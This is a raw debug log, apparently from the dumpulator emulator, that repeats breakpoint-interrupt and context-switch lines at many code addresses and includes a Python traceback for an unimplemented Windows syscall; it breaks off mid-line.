context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a2f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a3b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a52, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a57, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a6d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a88, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458a95, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d9d4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d9dc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 initial unmapped read from d80000[1], cip = 465b3b, exception: ExceptionType.Memory, (0x465b3b, 0x35, 16) protect 0x770f9000[0x3000] = PAGE_READWRITE protect 0x770f9000[0x3000] = PAGE_READONLY initial unmapped read from d71000[1], cip = 4654a4, exception: ExceptionType.Memory, (0x4654a4, 0xc, 6) final unmapped read from d71000[1], cip = 4654a4, exception: ExceptionType.Memory, (0x4654a4, 0xc, 6) . Traceback (most recent call last): File &#34;/Users/herrcore/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py&#34;, line 1329, in _hook_syscall status = syscall_impl(dp, *args) File &#34;/Users/herrcore/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/ntsyscalls.py&#34;, line 2888, in ZwQueryInformationJobObject raise NotImplementedError() NotImplementedError . Exception thrown during syscall implementation, stopping emulation! forced exit memory operation 21 of 4fe2[1] = 0 protect 0x770f9000[0x3000] = PAGE_READWRITE protect 0x770f9000[0x3000] = PAGE_READONLY interrupt 3 (#BP, Breakpoint), cip = 458aa2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458aaa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ac8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ad1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ae3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b02, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b10, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b25, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b3f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b47, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b5e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b76, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b7a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458b90, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ba2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458bb3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458bcb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c26, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c39, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c47, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c54, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c6a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c84, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458c95, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458cac, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458cc3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458cf2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d05, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d0f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d2c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d3e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d56, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d62, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d75, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458d7e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458dab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458db2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458dcd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458dde, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458dfb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e0a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e0f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e24, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e32, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e4d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e5b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e5b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e5b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458e75, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ed2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458ee5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458eef, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f0f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458f1f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45976a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459779, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459791, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4597b8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4597bd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4597ce, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4597de, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4597ed, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459806, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45981f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45982b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45983a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459855, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459868, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45987d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459886, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459899, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4598a9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4598b3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4598c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4598da, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4598eb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4598fc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45990e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45991f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45993b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459949, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459955, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45996a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459975, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459987, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459998, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4599b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4599c9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4599df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4599ee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4599fe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459a70, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459a8a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459a96, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459aab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ac5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ad4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ae4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459af1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b0b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b16, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b20, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b38, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b54, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b6f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b76, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b94, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459b9b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459bab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459bbd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459bc6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459bde, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459bff, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c09, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c25, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c34, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c45, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c6a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c83, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459c98, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459cb7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459cc5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ce3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459d45, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459d50, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459d74, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459d95, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459d9e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459db0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459db4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459dc2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459dd7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459de8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459df4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459dfe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459e22, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459e3a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459e57, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459e6b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459e80, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459e92, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ea4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459eb8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ebd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ed6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459ee6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459eff, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f13, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f25, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f39, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f4b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f56, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f6f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 459f79, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a006, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a01c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a038, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a047, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a05a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a063, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a072, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a084, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a091, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a0b1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a0bc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a0d7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a0f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a102, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a112, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a11c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a12f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a154, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a166, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a179, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a18a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a194, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a1ac, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a1b6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a1dd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a1f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a201, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a214, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a227, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a24a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a268, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a277, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a27c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a27c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a27c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a2f4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a300, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a31d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a330, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a33f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a353, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a36a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a376, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a385, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a38f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a3a5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a3b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a3c5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a3cf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a3eb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45a3ef, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, 